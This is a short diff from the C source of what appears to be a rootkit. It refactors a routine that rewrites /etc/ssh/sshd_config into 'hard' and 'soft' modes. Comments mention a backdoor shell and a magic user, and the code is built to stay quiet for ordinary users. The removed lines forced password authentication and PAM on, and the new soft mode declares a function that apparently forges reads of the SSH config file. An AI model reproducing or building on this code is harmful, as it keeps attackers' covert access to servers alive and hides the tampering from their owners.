@@ -11,7 +11,7 @@ void pam_syslog(const pam_handle_t *pamh, int priority, const char *fmt, ...);
 void pam_vsyslog(const pam_handle_t *pamh, int priority, const char *fmt, va_list args);
 #include "pam/pam_syslog.c"
 
-#ifdef PATCH_SSHD_CONFIG
+#ifdef HARD_PATCH_SSHD_CONFIG
 
 /* if the size of /etc/ssh/sshd_config's contents
  * is larger than this number, only allocate memory
@@ -22,19 +22,17 @@ void pam_vsyslog(const pam_handle_t *pamh, int priority, const char *fmt, va_lis
 #define MAGIC_USR 1 // sshdpatch will print stuff out when called from backdoor shell..
 #define REG_USR   2 // stays totally quiet otherwise.
 
-static char *const patchtargets[2] = {"PasswordAuthentication",
-                                      "UsePAM"};
-static char *const antival[sizeofarr(patchtargets)]   = {"no",  // what we don't want.
-                                                         "no"};
-static char *const targetval[sizeofarr(patchtargets)] = {"yes", // what we do want.
-                                                         "yes"};
-
 void addsetting(char *setting, char *value, char **buf);
-size_t writesshd(char *buf, int mode);
+size_t writesshd(char *buf);
 int sshdok(int res[], char **buf, size_t *sshdsize);
-void sshdpatch(int mode);
-#include "sshdpatch/sshdchk.c"
+void sshdpatch(void);
+#include "sshdpatch/hard.c"
 
+#endif
+
+#ifdef SOFT_PATCH_SSHD_CONFIG
+FILE *sshdforge(const char *pathname);
+#include "sshdpatch/soft.c"
 #endif
 
 #endif
